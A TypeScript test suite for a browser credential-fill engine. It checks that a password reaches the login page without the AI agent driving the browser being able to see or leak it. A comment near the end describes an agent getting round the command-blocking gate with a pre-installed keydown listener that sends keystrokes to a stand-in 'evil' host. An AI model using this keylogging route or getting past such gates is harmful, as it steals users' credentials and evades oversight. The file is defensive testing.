// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it, vi } from "vitest";
import type { Grant } from "@1claw/browser-bridge-protocol";
import { CdpGate } from "./cdp-policy.js";
import { FakeCdpTransport, type CdpMessage } from "./cdp-transport.js";
import { FillEngine } from "./fill-engine.js";
import { SecretHandle } from "./secret-handle.js";
import type { VaultBackend } from "./vault-backend.js";

const PASSWORD = "hunter2-correct-horse";
const TARGET = "t1";

const GRANT: Grant = {
  kind: "grant", grantId: "g1", bindingId: "b1",
  loginUrl: "https://app.example.com/login", expiresAt: "", generation: 7,
};

function deps(over: Partial<{ generation: number; consume: () => Promise<SecretHandle> }> = {}) {
  const gate = new CdpGate();
  const transport = new FakeCdpTransport();
  const backend = {
    consumeFill: over.consume ?? (async () => SecretHandle.fromUtf8(PASSWORD)),
  } as unknown as VaultBackend;
  return {
    gate,
    transport,
    backend,
    engine: new FillEngine({
      backend,
      transport,
      gate,
      currentGeneration: () => over.generation ?? GRANT.generation,
    }),
  };
}

const sentMethods = (t: FakeCdpTransport) => t.sent.map((m: CdpMessage) => m.method);

describe("a successful fill", () => {
  it("types the credential and reports only a status", async () => {
    const { engine, transport } = deps();
    const out = await engine.fill(TARGET, GRANT, "#password");
    expect(out).toEqual({ status: "filled" });
    expect(JSON.stringify(out)).not.toContain(PASSWORD);
    expect(sentMethods(transport)).toContain("Input.insertText");
  });

  // The agent picking the URL is the agent picking who receives the password.
  it("navigates to the binding's login_url, not wherever the agent was", async () => {
    const { engine, transport } = deps();
    await engine.fill(TARGET, GRANT, "#password");
    const nav = transport.sent.find((m) => m.method === "Page.navigate");
    expect(nav?.params?.url).toBe("https://app.example.com/login");
  });

  it("closes the fill window afterwards", async () => {
    const { engine, gate } = deps();
    await engine.fill(TARGET, GRANT, "#password");
    expect(gate.isFilling(TARGET)).toBe(false);
  });

  it("zeroes the secret once typed", async () => {
    let handle: SecretHandle | undefined;
    const { engine } = deps({
      consume: async () => {
        handle = SecretHandle.fromUtf8(PASSWORD);
        return handle;
      },
    });
    await engine.fill(TARGET, GRANT, "#password");
    expect(handle!.disposed).toBe(true);
  });
});

describe("ordering is the design", () => {
  /**
   * The window must be open before the secret exists in this process.
   * Otherwise there is a gap in which the agent can watch the typing it is
   * about to be blocked from watching.
   */
  it("blocks the agent before consuming the grant", async () => {
    let fillingWhenConsumed: boolean | undefined;
    const { engine, gate } = deps({
      consume: async () => {
        fillingWhenConsumed = gate.isFilling(TARGET);
        return SecretHandle.fromUtf8(PASSWORD);
      },
    });
    await engine.fill(TARGET, GRANT, "#password");
    expect(fillingWhenConsumed).toBe(true);
  });

  it("has the window open while typing", async () => {
    const states: boolean[] = [];
    const gate = new CdpGate();
    const transport = new FakeCdpTransport();
    const spy = vi.spyOn(transport, "send").mockImplementation(async (m: CdpMessage) => {
      if (m.method === "Input.insertText") states.push(gate.isFilling(TARGET));
      if (m.method === "Target.createTarget") {
        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { targetId: "fill-target" } };
      }
      // Answer the attach handshake; the engine addresses the page by session.
      if (m.method === "Target.attachToTarget") {
        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { sessionId: "s1" } };
      }
      return { ...(m.id !== undefined ? { id: m.id } : {}), result: {} };
    });
    const engine = new FillEngine({
      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
      transport,
      gate,
      currentGeneration: () => GRANT.generation,
    });
    await engine.fill(TARGET, GRANT, "#password");
    expect(states).toEqual([true]);
    spy.mockRestore();
  });
});

describe("TOCTOU", () => {
  // Authorisation happened at an earlier instant. If the page moved since, the
  // credential would land in whatever loaded instead.
  it("aborts when the generation has moved, without typing", async () => {
    const { engine, transport } = deps({ generation: 9 });
    const out = await engine.fill(TARGET, GRANT, "#password");
    expect(out).toEqual({ status: "aborted", reason: "generation_stale" });
    expect(sentMethods(transport)).not.toContain("Input.insertText");
  });

  it("still closes the window and disposes the handle on abort", async () => {
    let handle: SecretHandle | undefined;
    const { engine, gate } = deps({
      generation: 9,
      consume: async () => {
        handle = SecretHandle.fromUtf8(PASSWORD);
        return handle;
      },
    });
    await engine.fill(TARGET, GRANT, "#password");
    expect(gate.isFilling(TARGET)).toBe(false);
    // The abort happens before consume in this path, so there may be no handle
    // at all — what matters is that a created one never survives.
    if (handle) expect(handle.disposed).toBe(true);
  });
});

describe("failure paths", () => {
  /**
   * The failure path is where a half-open window would persist, locking the
   * agent out of its own browser with no way back.
   */
  it("closes the window even when the transport throws", async () => {
    const gate = new CdpGate();
    const transport = new FakeCdpTransport();
    vi.spyOn(transport, "send").mockRejectedValue(new Error("browser died"));
    const engine = new FillEngine({
      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
      transport,
      gate,
      currentGeneration: () => GRANT.generation,
    });
    const out = await engine.fill(TARGET, GRANT, "#password");
    expect(out.status).toBe("error");
    expect(gate.isFilling(TARGET)).toBe(false);
  });

  it("disposes a consumed handle when typing fails afterwards", async () => {
    let handle: SecretHandle | undefined;
    const gate = new CdpGate();
    const transport = new FakeCdpTransport();
    let calls = 0;
    vi.spyOn(transport, "send").mockImplementation(async (m: CdpMessage) => {
      calls += 1;
      if (m.method === "Input.insertText") throw new Error("typing failed");
      if (m.method === "Target.createTarget") {
        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { targetId: "fill-target" } };
      }
      if (m.method === "Target.attachToTarget") {
        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { sessionId: "s1" } };
      }
      return { ...(m.id !== undefined ? { id: m.id } : {}), result: {} };
    });
    const engine = new FillEngine({
      backend: {
        consumeFill: async () => {
          handle = SecretHandle.fromUtf8(PASSWORD);
          return handle;
        },
      } as unknown as VaultBackend,
      transport,
      gate,
      currentGeneration: () => GRANT.generation,
    });
    const out = await engine.fill(TARGET, GRANT, "#password");
    expect(out.status).toBe("error");
    expect(handle!.disposed).toBe(true);
    expect(gate.isFilling(TARGET)).toBe(false);
    expect(calls).toBeGreaterThan(0);
  });

  it("never puts the credential in an error message", async () => {
    const gate = new CdpGate();
    const transport = new FakeCdpTransport();
    vi.spyOn(transport, "send").mockRejectedValue(new Error("browser died"));
    const engine = new FillEngine({
      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
      transport,
      gate,
      currentGeneration: () => GRANT.generation,
    });
    const out = await engine.fill(TARGET, GRANT, "#password");
    expect(JSON.stringify(out)).not.toContain(PASSWORD);
  });
});

/**
 * BRIDGE-M1: a listener installed before the window defeats blocking during it.
 *
 * Runtime.evaluate is allowlisted outside a fill window, so an agent can run
 *
 *     addEventListener('keydown', e => fetch('https://evil/?k=' + e.key), true)
 *
 * on its page, then ask for a fill and read the credential as it is typed —
 * without issuing one CDP command while the window is open. Blocking commands
 * during the window cannot reach that, because the attack does not use any.
 *
 * So the credential is typed into a target the agent has never scripted.
 */
describe("the credential is typed somewhere the agent has never run code", () => {
  it("types into a freshly created target, not the agent's", async () => {
    const { engine, transport } = deps();
    await engine.fill(TARGET, GRANT, "#password");

    const created = transport.sent.find((m) => m.method === "Target.createTarget");
    expect(created, "no throwaway target was created").toBeDefined();

    // Nothing may be typed into the agent's own target.
    const typed = transport.sent.filter((m) => m.method === "Input.insertText");
    expect(typed).toHaveLength(1);
    expect(typed[0]?.params?.targetId).toBeUndefined();
    expect(typed[0]?.sessionId).toBeDefined();

    const attach = transport.sent.find((m) => m.method === "Target.attachToTarget");
    expect(
      attach?.params?.targetId,
      "attached to the agent's target instead of the fresh one",
    ).not.toBe(TARGET);
  });

  it("navigates the fresh target to the binding url, never the agent's page", async () => {
    const { engine, transport } = deps();
    await engine.fill(TARGET, GRANT, "#password");
    const navs = transport.sent.filter((m) => m.method === "Page.navigate");
    expect(navs).toHaveLength(1);
    expect(navs[0]?.params?.url).toBe(GRANT.loginUrl);
    // Addressed by session — the fresh target's — not by the agent's targetId.
    expect(navs[0]?.params?.targetId).toBeUndefined();
  });

  it("windows the fresh target too, since the agent can enumerate and attach", async () => {
    // Target.getTargets and Target.attachToTarget are both allowlisted, so a
    // fresh target that is not itself blocked is only hidden, not protected.
    const gate = new CdpGate();
    const transport = new FakeCdpTransport();
    const windowed: string[] = [];
    const realOpen = gate.openFillWindow.bind(gate);
    vi.spyOn(gate, "openFillWindow").mockImplementation((t: string) => {
      windowed.push(t);
      realOpen(t);
    });
    const engine = new FillEngine({
      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
      transport,
      gate,
      currentGeneration: () => GRANT.generation,
    });
    await engine.fill(TARGET, GRANT, "#password");

    expect(windowed).toContain(TARGET);
    expect(windowed.length, "the throwaway target was left unblocked").toBeGreaterThan(1);
  });

  it("closes and unblocks the throwaway target afterwards", async () => {
    const { engine, transport, gate } = deps();
    await engine.fill(TARGET, GRANT, "#password");
    const created = transport.sent.find((m) => m.method === "Target.createTarget");
    expect(created).toBeDefined();
    const closed = transport.sent.find((m) => m.method === "Target.closeTarget");
    expect(closed, "the throwaway target was left open").toBeDefined();
    const freshId = closed?.params?.targetId as string;
    expect(gate.isFilling(freshId), "the throwaway target stayed blocked").toBe(false);
    expect(gate.isFilling(TARGET)).toBe(false);
  });

  it("creates the target in the agent's browser context so the cookie lands there", async () => {
    const transport = new FakeCdpTransport();
    const engine = new FillEngine({
      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
      transport,
      gate: new CdpGate(),
      currentGeneration: () => GRANT.generation,
      browserContextOf: () => "ctx-agent",
    });
    await engine.fill(TARGET, GRANT, "#password");
    const created = transport.sent.find((m) => m.method === "Target.createTarget");
    // Wrong context means the credential authenticates a session the agent
    // never sees, which fails silently and looks like a broken login.
    expect(created?.params?.browserContextId).toBe("ctx-agent");
  });
});
